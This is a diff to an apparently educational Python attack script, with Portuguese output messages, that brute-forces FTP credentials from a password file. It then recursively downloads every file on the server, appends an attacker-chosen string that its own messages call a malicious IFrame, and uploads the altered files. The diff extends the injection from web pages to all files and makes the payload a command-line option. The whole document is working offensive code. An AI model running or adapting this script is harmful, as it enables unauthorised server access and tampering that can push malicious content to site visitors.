@@ -1,8 +1,11 @@
-import ftplib, optparse
+import ftplib
+import optparse
+import os
+
 
 def bruteForce(host, pw_file):
     pw_file = open(pw_file, 'r')
-    
+
     for line in pw_file.readlines():
         user = line.split(':')[0]
         pw = line.split(':')[1].strip('\r').strip('\n')
@@ -10,8 +13,8 @@ def bruteForce(host, pw_file):
         try:
             ftp = ftplib.FTP(host, timeout=5)
             ftp.login(user, pw)
-            print('\n[*] ' + host + \
-                ' FTP Login Sucesso: ' + user + "/" + pw)
+            print('\n[*] ' + host +
+                  ' FTP Login Sucesso: ' + user + "/" + pw)
             ftp.quit()
             return (user, pw)
         except Exception:
@@ -32,64 +35,70 @@ def loginAnonimo(host_alvo):
     return False
 
 
-def listPages(ftp):
-    try:
-        lista_diretorios = ftp.nlst()
-    except:
-        lista_diretorios = []
-        print('[-] Não foi possível listar o conteúdo.')
-        return []
-
-    lista_arquivos: list[str] = []
-
-    print("\n[+] Arquivos")
-    for fileName in lista_diretorios:
-        print(fileName)
-        fn = fileName.lower()
-        if '.php' in fn or '.htm' in fn or '.asp' in fn:
-            print('[+] Encontrado a página padrão: ' + fileName)
-            lista_arquivos.append(fileName)
-    return lista_arquivos
+def listFiles(ftp, path=''):
+    files = []
+    for item in ftp.nlst(path or "/home/ftpuser"):
+        if '.' in item:
+            files.append(item.replace('/home/ftpuser', '')[1:])
+        else:
+            files += listFiles(ftp, path=item)
+    return files
 
 
-def injectPage(ftp, pagina, redirecionar):
-    f = open(pagina + '.tmp', 'w')
-    ftp.retrlines('RETR ' + pagina, f.write)
-    print('[+] Página baixada: ' + pagina)
+def injectPage(ftp, filename, redirect):
+    print(filename)
 
-    f.write(redirecionar)
+    dir_path = os.path.dirname(filename)
+
+    if dir_path != '':
+        if not os.path.exists(dir_path):
+            os.makedirs(dir_path)
+
+    f = open(filename + '.tmp', 'w')
+    ftp.retrlines('RETR ' + filename, f.write)
+    print('[+] Página baixada: ' + filename)
+
+    f.write(redirect)
     f.close()
-    print('[+] Injetado IFrame malicioso em: ' + pagina)
+    print('[+] Injetado IFrame malicioso em: ' + filename)
 
-    ftp.storlines('STOR ' + pagina, open(pagina + '.tmp'))
-    print('[+] Página injetada enviada: ' + pagina)
+    ftp.storbinary('STOR ' + filename, open(filename + '.tmp', 'rb'))
+    print('[+] Página injetada enviada: ' + filename)
 
 
 def start():
     opt = optparse.OptionParser('Use -H <host> -f <passwords_file>')
     opt.add_option('-H', dest='host', type='string', help='specify the host')
-    opt.add_option('-f', dest='file', type='string', help='specify the users and passwords file')
+    opt.add_option('-f', dest='file', type='string',
+                   help='specify the users and passwords file')
+    opt.add_option('-r', dest='injectable', type='string',
+                   help='specify the injetable string')
 
     (options, _) = opt.parse_args()
 
     host = options.host
     file = options.file
+    injectable = options.injectable
 
     if (host == None) | (file == None):
         print(opt.usage)
         exit(0)
-    
+
     (user, pw) = bruteForce(host, file)
 
-    loginAnonimo(host)
+    # loginAnonimo(host)
 
     ftp = ftplib.FTP(host)
     ftp.login(user, pw)
 
-    pages: list[str] = listPages(ftp)
+    pages: list[str] = listFiles(ftp)
+
+    print("\n[-] Arquivos encontrados: " + str(len(pages)))
+
+    print("\n[-] Inject Pages")
 
     for page in pages:
-        injectPage(ftp, page, "<h1>Will it work?</h1>" )
+        injectPage(ftp, page, injectable)
 
 
 if __name__ == "__main__":
